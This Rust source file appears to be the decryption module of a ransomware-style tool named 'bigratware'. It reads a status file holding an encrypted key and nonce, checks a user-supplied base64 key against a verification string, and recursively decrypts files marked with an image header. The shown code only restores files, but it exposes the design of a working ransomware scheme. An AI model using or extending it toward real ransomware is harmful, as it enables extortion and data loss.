use std::fs::{File, OpenOptions};
use std::{fs, io};
use std::io::{Read, Seek, SeekFrom};
use std::path::Path;
use anyhow::{Context, Result};
use base64::Engine;
use chacha20poly1305::aead::stream::DecryptorBE32;
use chacha20poly1305::{KeyInit, XChaCha20Poly1305};
use decryptor::decrypt_file_chacha;
use decryptor::helpers::gen_new_path;
use crate::BIGRAT_PNG;
use crate::encryptor::{STATUS_VERIFY_ENCRYPTED_STR_LEN, STATUS_VERIFY_STR};

#[derive(Debug, Clone)]
pub enum Status {
    Started,
    Finished,
}

#[derive(Debug, Clone)]
pub struct StatusData {
    pub status: Status,
    pub encrypted_verify_str: [u8; STATUS_VERIFY_ENCRYPTED_STR_LEN],
    pub encrypted_key: [u8; 256],
    pub encrypted_nonce: [u8; 256],
}

impl Default for StatusData {
    fn default() -> Self {
        Self {
            status: Status::Started,
            encrypted_verify_str: [0; STATUS_VERIFY_ENCRYPTED_STR_LEN],
            encrypted_key: [0u8; 256],
            encrypted_nonce: [0u8; 256],
        }
    }
}

#[derive(Debug)]
pub enum StatusReadError {
    IoError(io::Error),
    DoesNotExist,
    Invalid(String),
}

impl From<io::Error> for StatusReadError {
    fn from(value: io::Error) -> Self {
        Self::IoError(value)
    }
}

/// Get encrypted key, encrypted nonce and status of the encryption process
/// (started or finished) from a `$working_path/.bigrat-status` file
pub fn get_status_data(working_path: &Path) -> core::result::Result<StatusData, StatusReadError> {
    let status_file_path = working_path.join(".bigrat-status");
    if !status_file_path.exists() {
        return Err(StatusReadError::DoesNotExist);
    }
    let mut status_file = File::open(status_file_path)?;
    if status_file.metadata()?.len() <= BIGRAT_PNG.len() as u64 + 512 {
        return Err(StatusReadError::Invalid("File is smaller then expected".to_string()));
    }
    status_file.seek(SeekFrom::Start((BIGRAT_PNG.len() + 512 + STATUS_VERIFY_ENCRYPTED_STR_LEN) as u64))?;

    let mut status = String::new();
    status_file.read_to_string(&mut status)?;
    let mut statuses = status.split(';')
        .map(|s| s.strip_prefix("BIGRATWARE_STATUS=").unwrap_or(""))
        .collect::<Vec<&str>>();
    statuses.pop();
    let status = match statuses.last() {
        None => return Err(StatusReadError::Invalid("No actual status string found".to_string())),
        Some(&"started") => Status::Started,
        Some(&"finished") => Status::Finished,
        Some(val) => return Err(StatusReadError::Invalid(format!("Unrecognized status: {val}"))),
    };

    status_file.seek(SeekFrom::Start(BIGRAT_PNG.len() as u64))?;
    let mut encrypted_key = [0u8; 256];
    let _ = status_file.read(&mut encrypted_key)?;
    let mut encrypted_nonce = [0u8; 256];
    let _ = status_file.read(&mut encrypted_nonce)?;
    let mut encrypted_verify_str = [0u8; STATUS_VERIFY_ENCRYPTED_STR_LEN];
    let _ = status_file.read(&mut encrypted_verify_str)?;

    Ok(StatusData {
        status,
        encrypted_verify_str,
        encrypted_key,
        encrypted_nonce,
    })
}

pub fn decode_pair_base64(pair_base64: &str) -> Result<([u8; 32], [u8; 19])> {
    let mut pair = [0u8; 32+19];
    // Ignoring trailing bits, because of the nature of base64
    // https://github.com/marshallpierce/rust-base64#i-want-canonical-base64-encodingdecoding
    base64::engine::general_purpose::STANDARD_NO_PAD.decode_slice(pair_base64, &mut pair)
        .with_context(|| "Error decoding base64 of encrypted key-nonce pair")?;

    Ok((
        <[u8; 32]>::try_from(&pair[..32])?,
        <[u8; 19]>::try_from(&pair[32..])?,
    ))
}

pub fn decrypt_recursive(
    path: &Path,
    key: &[u8; 32],
    nonce: &[u8; 19],
    encrypted_key: &[u8; 256],
) -> Result<()> {
    'entries: for entry in path.read_dir()? {
        let entry = entry?;
        if entry.file_type()?.is_dir() {
            if let Err(err) = decrypt_recursive(&entry.path(), key, nonce, encrypted_key) {
                eprintln!("Error decrypting directory {:?}: {}", entry.path(), err);
            }
            continue;
        }

        let mut encrypted_file = File::open(entry.path())?;
        let dist_file_path = gen_new_path(entry.path().with_extension(""), false)?;
        let dist_file = OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&dist_file_path)?;

        if let Err(e) = encrypted_file.seek(SeekFrom::Start(BIGRAT_PNG.len() as u64)) {
            eprintln!("Cannot read file {:?}: {e}", dist_file_path.display());
            fs::remove_file(&dist_file_path)?;
            continue;
        }
        let mut buffer = [0u8; 1];
        for byte in encrypted_key {
            if let Err(e) = encrypted_file.read(&mut buffer) {
                eprintln!("Cannot read file {:?}: {e}", entry.path().display());
                fs::remove_file(&dist_file_path)?;
                continue;
            }
            if byte != &buffer[0] {
                eprintln!(
                    "File {:?} is either not encrypted or encrypted with a different key",
                    entry.path().display(),
                );
                fs::remove_file(&dist_file_path)?;
                continue 'entries;
            }
        }

        if let Err(error) = decrypt_file_chacha(
            &encrypted_file,
            &dist_file,
            *key,
            *nonce
        ) {
            eprintln!("Failed to decrypt file {:?}: {}", entry.path().display(), error);
            fs::remove_file(dist_file_path)?;
            continue;
        }
    }

    Ok(())
}

/// Verify user-supplied key-nonce pair against the verification string from the status file
/// Returns `true` if the string is successfully decrypted and matches the original
pub fn verify_supplied_pair(
    key: &[u8; 32],
    nonce: &[u8; 19],
    encrypted_verify_str: &[u8; STATUS_VERIFY_ENCRYPTED_STR_LEN],
) -> bool {
    let aead = XChaCha20Poly1305::new(key.into());
    let stream_decryptor = DecryptorBE32::from_aead(aead, nonce.as_ref().into());
    let decrypted_verify_str = stream_decryptor.decrypt_last(encrypted_verify_str.as_slice());

    match decrypted_verify_str {
        Ok(value) => {
            if value == STATUS_VERIFY_STR {
                true
            } else {
                eprintln!(
                    "Status verification string does not match: expected {:?}, found {:?}",
                    STATUS_VERIFY_STR,
                    value,
                );
                false
            }
        }
        Err(err) => {
            eprintln!("Error decrypting status verification string: {err}");
            false
        }
    }
}
